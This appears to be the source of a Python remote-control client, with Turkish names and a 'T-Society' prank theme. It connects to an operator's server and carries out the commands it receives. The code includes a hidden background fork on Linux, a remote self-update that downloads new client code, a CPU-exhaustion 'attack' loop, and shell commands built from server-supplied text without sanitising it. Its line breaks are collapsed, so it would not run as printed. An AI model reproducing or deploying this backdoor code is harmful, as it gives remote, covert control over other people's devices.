=== client.py ===

import socket import platform import os import urllib.request import ctypes import subprocess import threading import time

def cihaz_tipi(): sistem = platform.system() if sistem == "Linux": if "Android" in platform.platform(): return "Telefon" else: return "Linux PC" elif sistem == "Windows": return "Windows PC" elif sistem == "Darwin": return "Mac" return "Bilinmeyen"

def arkaplan_degistir(url): try: urllib.request.urlretrieve(url, "arkaplan.jpg") if cihaz == "Telefon": os.system("termux-wallpaper -f arkaplan.jpg") elif cihaz == "Windows PC": yol = os.path.abspath("arkaplan.jpg") ctypes.windll.user32.SystemParametersInfoW(20, 0, yol, 3) elif cihaz == "Linux PC": os.system("gsettings set org.gnome.desktop.background picture-uri file://$PWD/arkaplan.jpg") s.send("[✓] Arka plan degistirildi\n".encode()) except: s.send("[!] Arka plan degistirilemedi\n".encode())

def saka_modu(mesaj="T-Society buradaydı!"): try: if cihaz == "Telefon": os.system(f'termux-notification --title "Şaka" --content "{mesaj}"') elif cihaz == "Windows PC": os.system(f'msg * "{mesaj}"') elif cihaz == "Linux PC": os.system(f'notify-send "Şaka" "{mesaj}"') s.send("[!] Şaka modu mesajı gönderildi!\n".encode()) except: s.send("[!] Şaka mesajı gönderilemedi.\n".encode())

def google_ac(): try: if cihaz == "Telefon": os.system("termux-open-url https://www.google.com") elif cihaz == "Windows PC": os.system("start https://www.google.com") elif cihaz == "Linux PC": os.system("xdg-open https://www.google.com") s.send("[✓] Google açıldı\n".encode()) except: s.send("[!] Google açılamadı\n".encode())

def dosya_olustur(): try: with open("saka.txt", "w") as f: f.write("T-Society buradaydı!") s.send("[+] Dosya olusturuldu\n".encode()) except: s.send("[!] Dosya olusturulamadı\n".encode())

def saldiri_yap(): try: for _ in range(1000000): _ = 9 ** 999 s.send("[✓] Cihaz kasarildi\n".encode()) except: s.send("[!] Saldırı başarısız\n".encode())

def guncelle(): try: url = "https://example.com/client.py"  # Güncel client URL urllib.request.urlretrieve(url, "client.py") s.send("[✓] Güncelleme indirildi.\n".encode()) except: s.send("[!] Güncelleme başarısız.\n".encode())

=== GİZLİ BAŞLATMA ===

if platform.system() == "Linux": if os.fork() > 0: exit()

=== BAĞLANTI ===

cihaz = cihaz_tipi() SERVER_IP = input("Server IP gir: ") PORT = int(input("Port gir: "))

s = socket.socket() try: s.connect((SERVER_IP, PORT)) s.send(f"[+] {cihaz} baglandi.".encode()) except: print("[!] Baglanti hatasi.") exit()

=== KOMUT DÖNGÜSÜ ===

while True: try: komut = s.recv(1024).decode().strip() if komut == "google": google_ac() elif komut == "saldiri": saldiri_yap() elif komut == "dosya": dosya_olustur() elif komut.startswith("arkaplan "): _, url = komut.split(" ", 1) arkaplan_degistir(url) elif komut.startswith("saka "): _, mesaj = komut.split(" ", 1) saka_modu(mesaj) elif komut == "guncelle": guncelle() elif komut == "exit": s.close() break else: s.send("[!] Bilinmeyen komut\n".encode()) except Exception as e: break

